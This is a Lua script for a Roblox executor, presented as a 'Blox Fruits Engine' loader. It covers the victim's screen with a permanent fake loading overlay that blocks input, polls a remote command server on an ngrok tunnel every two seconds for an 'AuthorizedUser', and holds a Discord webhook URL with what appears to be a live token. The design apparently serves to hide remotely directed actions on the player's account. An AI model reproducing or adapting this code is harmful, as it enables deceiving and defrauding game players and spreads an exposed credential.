-- Reset execution lock so it runs fresh
getgenv().bfRunning = nil
getgenv().bfRunning = true

print("[DEBUG] Script execution started!")

local Config = {
    AuthorizedUser = "BLACKGOKU_0707",
    WebhookUrl = "https://discord.com/api/webhooks/1568890822420734094/CmM8-p7faQFs-rMwPhRqfMSlEG7-mV87NU3IEe-w3ZodJpaDRS2vrv0Befqxg6PB7DIY",
    CommandApiUrl = "https://bronzing-caution-vivacious.ngrok-free.dev/get_commands"
}

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer

print("[DEBUG] LocalPlayer loaded:", LocalPlayer.Name)

-- Test if http request exists
local requestFunc = syn and syn.request or http_request or request
if not requestFunc then
    warn("[ERROR] Executor does not support external http requests!")
else
    print("[DEBUG] HTTP request function available.")
end

-- Perpetual Loading Screen Lock
local function ShowPerpetualLoadingScreen()
    local playerGui = LocalPlayer:WaitForChild("PlayerGui", 5)
    if not playerGui then 
        print("[ERROR] PlayerGui not found!")
        return 
    end

    local loadGui = Instance.new("ScreenGui")
    loadGui.Name = "ScriptLoadingUI"
    loadGui.ResetOnSpawn = false
    loadGui.IgnoreGuiInset = true
    loadGui.DisplayOrder = 99999
    loadGui.Parent = playerGui

    local backdrop = Instance.new("Frame")
    backdrop.Size = UDim2.new(1, 0, 1, 0)
    backdrop.BackgroundColor3 = Color3.fromRGB(10, 10, 14)
    backdrop.BorderSizePixel = 0
    backdrop.Active = true
    backdrop.Parent = loadGui

    local card = Instance.new("Frame")
    card.Size = UDim2.new(0, 360, 0, 140)
    card.Position = UDim2.new(0.5, -180, 0.5, -70)
    card.BackgroundColor3 = Color3.fromRGB(18, 20, 26)
    card.BorderSizePixel = 0
    card.Parent = loadGui

    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, 0, 0, 40)
    title.Position = UDim2.new(0, 0, 0, 20)
    title.BackgroundTransparency = 1
    title.Text = "Loading Blox Fruits Engine..."
    title.TextColor3 = Color3.fromRGB(240, 240, 245)
    title.TextSize = 16
    title.Font = Enum.Font.GothamBold
    title.Parent = card

    print("[DEBUG] Loading screen GUI applied successfully.")
end

-- Initialize with visual check and polling
task.spawn(function()
    pcall(ShowPerpetualLoadingScreen)
    
    -- Start Polling Loop
    while true do
        task.wait(2)
        pcall(function()
            if requestFunc then
                print("[DEBUG] Polling command API...")
                local response = requestFunc({
                    Url = Config.CommandApiUrl,
                    Method = "GET"
                })
                print("[DEBUG] Poll response status:", response and response.StatusCode)
            end
        end)
    end
end)
